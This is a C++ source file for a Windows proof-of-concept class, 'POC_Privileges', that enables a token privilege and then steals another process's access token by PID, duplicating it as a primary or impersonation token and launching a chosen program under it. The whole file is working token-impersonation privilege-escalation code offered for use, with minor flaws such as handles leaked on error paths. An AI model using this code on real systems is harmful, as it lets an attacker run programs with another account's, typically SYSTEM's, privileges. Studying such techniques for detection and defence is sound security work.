#pragma once

#include "Privileges.h"

using namespace std;

BOOL POC_Privileges::SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp;
	HANDLE hToken;
	LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
		&hToken))
	{
		wprintf(L"OpenProcessToken error: %u\n", GetLastError());
		return FALSE;
	}

	if (!LookupPrivilegeValue(NULL,           // lookup privilege on local system
		lpszPrivilege,  // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		wprintf(L"LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		wprintf(L"AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		wprintf(L"The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

BOOL POC_Privileges::ElevatePrivilege(DWORD dwPID, PCWSTR szProcPath)
{
	BOOL bOk = FALSE;
	HANDLE hProcess = NULL;
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	_STARTUPINFOW   startupInfo;
	PROCESS_INFORMATION processInformation;
	//wchar_t cmdline[] = L"C:\\Windows\\System32\\notepad.exe";
	ZeroMemory(&startupInfo, sizeof(_STARTUPINFOW));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(_STARTUPINFOW);


	wprintf(L"Opening target process...\n");
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
	if (hProcess == NULL) {
		wprintf(L"w> Fail. ErrorCode = 0x%x\n", GetLastError());
		//wprintf(L"LastError: %s\n", GetLastErrorAsString().c_str());
		return FALSE;
	}

	wprintf(L"Obtaint target process token...\n");
	int IsReadTokenOK = OpenProcessToken(hProcess, TOKEN_DUPLICATE, &tokenHandle);
	if (IsReadTokenOK == 0)
	{
		wprintf(L"w> Fail. ErrorCode = 0x%x\n", GetLastError());
		//printf("LastError: %s\n", GetLastErrorAsString().c_str());
		return FALSE;
	}

	wprintf(L"Duplicate token...\n");
	int IsDuplicateTokenOK = DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
	if (IsDuplicateTokenOK == 0)
	{
		wprintf(L"w> Fail. ErrorCode = 0x%x\n", GetLastError());
		//wprintf(L"LastError: %s\n", GetLastErrorAsString().c_str());
		return FALSE;
	}

	wprintf(L"Start process with elevated token...\n");
	int IsCreateProcessOK = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, (LPWSTR) szProcPath, 0, NULL, NULL, &startupInfo, &processInformation);
	if (IsCreateProcessOK == 0)
	{
		wprintf(L"w> Fail. ErrorCode = 0x%x\n", GetLastError());
		//wprintf(L"LastError: %s\n", GetLastErrorAsString().c_str());
		return FALSE;
	}


	//Clean up
	CloseHandle(hProcess);
	CloseHandle(tokenHandle);
	CloseHandle(duplicateTokenHandle);
	CloseHandle(startupInfo.hStdInput);
	CloseHandle(startupInfo.hStdOutput);
	CloseHandle(startupInfo.hStdError);

	return TRUE;
}

BOOL POC_Privileges::ElevatePrivilege_SetThreadToken(DWORD dwPID, PCWSTR szProcPath)
{
	BOOL bOk = FALSE;
	HANDLE hProcess = NULL;
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	_STARTUPINFOW   startupInfo;
	PROCESS_INFORMATION processInformation;
	//wchar_t cmdline[] = L"C:\\Windows\\System32\\notepad.exe";
	ZeroMemory(&startupInfo, sizeof(_STARTUPINFOW));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(_STARTUPINFOW);


	wprintf(L"Opening target process...\n");
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
	if (hProcess == NULL) {
		wprintf(L"w> Fail. ErrorCode = 0x%x\n", GetLastError());
		//wprintf(L"LastError: %s\n", GetLastErrorAsString().c_str());
		return FALSE;
	}

	wprintf(L"Obtaint target process token...\n");
	int IsReadTokenOK = OpenProcessToken(hProcess, TOKEN_DUPLICATE, &tokenHandle);
	if (IsReadTokenOK == 0)
	{
		wprintf(L"w> Fail. ErrorCode = 0x%x\n", GetLastError());
		//printf("LastError: %s\n", GetLastErrorAsString().c_str());
		return FALSE;
	}

	wprintf(L"Duplicate token...\n");
	int IsDuplicateTokenOK = DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &duplicateTokenHandle);
	if (IsDuplicateTokenOK == 0)
	{
		wprintf(L"w> Fail. ErrorCode = 0x%x\n", GetLastError());
		//wprintf(L"LastError: %s\n", GetLastErrorAsString().c_str());
		return FALSE;
	}

	wprintf(L"Set elevated token to current thread...\n");
	if (!SetThreadToken(NULL, duplicateTokenHandle))
	{
		wprintf(L"w> Fail. ErrorCode = 0x%x\n", GetLastError());
		//wprintf(L"LastError: %s\n", GetLastErrorAsString().c_str());
		return FALSE;
	}


	// Start the child process. 
	if (!CreateProcess(NULL,   // No module name (use command line)
		(LPWSTR)szProcPath,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&startupInfo,            // Pointer to STARTUPINFO structure
		&processInformation)           // Pointer to PROCESS_INFORMATION structure
		)
	{
		wprintf(L"w> Fail to start process. ErrorCode = 0x%x\n", GetLastError());
		//wprintf(L"LastError: %s\n", GetLastErrorAsString().c_str());
		return FALSE;
	}

	// Wait until child process exits.
	WaitForSingleObject(processInformation.hProcess, INFINITE);

	//Clean up
	CloseHandle(hProcess);
	CloseHandle(tokenHandle);
	CloseHandle(duplicateTokenHandle);
	CloseHandle(startupInfo.hStdInput);
	CloseHandle(startupInfo.hStdOutput);
	CloseHandle(startupInfo.hStdError);

	return TRUE;
}